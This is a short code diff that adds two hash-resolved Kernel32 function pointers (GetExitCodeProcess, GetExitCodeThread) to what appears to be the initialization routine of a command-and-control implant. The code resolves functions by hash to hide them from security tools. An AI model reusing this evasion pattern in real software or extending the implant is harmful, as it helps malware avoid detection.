@@ -73,6 +73,8 @@ VOID DxInitialization( VOID )
         Instance->Win32.Thread32First                       = LdrFunctionAddr( Instance->Modules.Kernel32, 0x93049a4a );
         Instance->Win32.GetComputerNameExA                  = LdrFunctionAddr( Instance->Modules.Kernel32, 0xd252a5f3 );
         Instance->Win32.ExitProcess                         = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb769339e );
+        Instance->Win32.GetExitCodeProcess                  = LdrFunctionAddr( Instance->Modules.Kernel32, 0xe21026f9 );
+        Instance->Win32.GetExitCodeThread                   = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb263c852 );
         Instance->Win32.TerminateProcess                    = LdrFunctionAddr( Instance->Modules.Kernel32, 0x60af076d );
         Instance->Win32.GetTickCount                        = LdrFunctionAddr( Instance->Modules.Kernel32, 0x41ad16b9 );
         Instance->Win32.ReadProcessMemory                   = LdrFunctionAddr( Instance->Modules.Kernel32, 0xb8932459 );
